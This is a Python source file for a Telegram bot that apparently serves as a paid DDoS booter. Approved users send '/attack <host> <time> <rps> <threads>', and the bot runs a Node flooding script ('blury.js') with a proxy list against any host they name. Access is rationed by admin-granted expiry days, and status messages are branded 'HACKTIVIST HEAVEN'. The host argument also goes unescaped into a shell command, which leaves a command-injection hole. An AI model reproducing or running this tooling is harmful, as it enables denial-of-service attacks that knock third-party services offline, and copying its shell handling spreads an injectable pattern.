import subprocess
import time
import threading
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

# Hardcoded main admin ID (Replace with your Telegram ID)
MAIN_ADMIN_ID = 123456789  

# Admins set (Main admin is always included)
admin_ids = {MAIN_ADMIN_ID}  

# Approved users storage
approved_users = {}

# Attack management
current_attack = None
attack_lock = threading.Lock()

# Check if user is approved
def is_user_approved(user_id):
    if user_id in approved_users:
        if approved_users[user_id] > time.time():
            return True
        else:
            del approved_users[user_id]
    return False

# Add admin command
def add_admin(update: Update, context: CallbackContext) -> None:
    try:
        user_id = update.message.from_user.id
        if user_id != MAIN_ADMIN_ID:
            update.message.reply_text("Only the main admin can add other admins.")
            return

        args = context.args
        if len(args) != 1:
            update.message.reply_text("Usage: /addadmin <admin_id>")
            return

        admin_id = int(args[0])
        admin_ids.add(admin_id)
        update.message.reply_text(f"User {admin_id} has been added as an admin.")
    except Exception as e:
        update.message.reply_text(f"Error: {str(e)}")

# Remove admin command
def remove_admin(update: Update, context: CallbackContext) -> None:
    try:
        user_id = update.message.from_user.id
        if user_id != MAIN_ADMIN_ID:
            update.message.reply_text("Only the main admin can remove other admins.")
            return

        args = context.args
        if len(args) != 1:
            update.message.reply_text("Usage: /removeadmin <admin_id>")
            return

        admin_id = int(args[0])
        if admin_id in admin_ids and admin_id != MAIN_ADMIN_ID:
            admin_ids.remove(admin_id)
            update.message.reply_text(f"User {admin_id} has been removed as an admin.")
        else:
            update.message.reply_text("Admin ID not found or cannot remove the main admin.")
    except Exception as e:
        update.message.reply_text(f"Error: {str(e)}")

# Add user command
def add_userid(update: Update, context: CallbackContext) -> None:
    try:
        user_id = update.message.from_user.id
        if user_id not in admin_ids:
            update.message.reply_text("You are not authorized to add users.")
            return

        args = context.args
        if len(args) != 2:
            update.message.reply_text("Usage: /adduserid <user_id> <days>")
            return

        target_user_id, days = map(int, args)
        approved_users[target_user_id] = time.time() + (days * 86400)
        update.message.reply_text(f"User {target_user_id} approved for {days} days.")
    except Exception as e:
        update.message.reply_text(f"Error: {str(e)}")

# List approved users
def list_users(update: Update, context: CallbackContext) -> None:
    if not approved_users:
        update.message.reply_text('No approved users.')
        return

    user_list = [
        f"User ID: {user_id}, Days Left: {(expiration - time.time()) / 86400:.1f}"
        for user_id, expiration in approved_users.items()
    ]
    update.message.reply_text('Approved Users:\n' + '\n'.join(user_list))

# Remove user command
def remove_user(update: Update, context: CallbackContext) -> None:
    try:
        user_id = update.message.from_user.id
        if user_id not in admin_ids:
            update.message.reply_text("You are not authorized to remove users.")
            return

        args = context.args
        if len(args) != 1:
            update.message.reply_text("Usage: /removeuser <user_id>")
            return

        target_user_id = int(args[0])
        if target_user_id in approved_users:
            del approved_users[target_user_id]
            update.message.reply_text(f"User {target_user_id} removed.")
        else:
            update.message.reply_text("User not found.")
    except Exception as e:
        update.message.reply_text(f"Error: {str(e)}")

# Attack command
def attack(update: Update, context: CallbackContext) -> None:
    global current_attack

    try:
        user_id = update.message.from_user.id
        if not is_user_approved(user_id):
            update.message.reply_text("You are not approved to use this command.")
            return

        if attack_lock.locked():
            update.message.reply_text("An attack is already running. Please wait.")
            return

        args = context.args
        if len(args) != 4:
            update.message.reply_text("Usage: /attack <host> <time> <rps> <threads>")
            return

        host, attack_time, rps, threads = args
        attack_time = int(attack_time)

        with attack_lock:
            current_attack = {
                'host': host,
                'user_id': user_id,
                'start_time': time.time(),
                'duration': attack_time,
                'remaining': attack_time
            }

            command = f"node blury.js {host} {attack_time} {rps} {threads} proxy.txt"
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            message = (
                "*🚀 ATTACK INITIATED 🚀*\n\n"
                f"*💣 Host: {host}*\n"
                f"*🔢 User ID: {user_id}*\n"
                f"*🕒 Duration: {attack_time} seconds*\n"
                f"*💥 Powered By HACKTIVIST HEAVEN*\n"
                f"*Time remaining: {attack_time} seconds*"
            )
            update.message.reply_text(message, parse_mode='Markdown')

            threading.Thread(target=update_attack_status, args=(update, context, process)).start()
    except Exception as e:
        update.message.reply_text(f"An error occurred: {str(e)}")

# Update attack status
def update_attack_status(update: Update, context: CallbackContext, process):
    global current_attack

    while current_attack and current_attack['remaining'] > 0:
        time.sleep(1)
        current_attack['remaining'] -= 1

        message = (
            "*🚀 ATTACK INITIATED 🚀*\n\n"
            f"*💣 Host: {current_attack['host']}*\n"
            f"*🔢 User ID: {current_attack['user_id']}*\n"
            f"*🕒 Duration: {current_attack['duration']} seconds*\n"
            f"*💥 Powered By RED HAT *\n"
            f"*Time remaining: {current_attack['remaining']} seconds*"
        )
        context.bot.edit_message_text(
            chat_id=update.message.chat_id,
            message_id=update.message.message_id + 1,
            text=message,
            parse_mode='Markdown'
        )

    current_attack = None
    stdout, stderr = process.communicate()

    if process.returncode == 0:
        update.message.reply_text("Attack completed successfully!")
    else:
        update.message.reply_text(f"Attack failed!\nError: {stderr.decode()}")

# Main function
def main() -> None:
    BOT_TOKEN = 'YOUR_BOT_TOKEN'
    updater = Updater(BOT_TOKEN)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("addadmin", add_admin))
    dispatcher.add_handler(CommandHandler("removeadmin", remove_admin))
    dispatcher.add_handler(CommandHandler("adduserid", add_userid))
    dispatcher.add_handler(CommandHandler("listusers", list_users))
    dispatcher.add_handler(CommandHandler("removeuser", remove_user))
    dispatcher.add_handler(CommandHandler("attack", attack))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()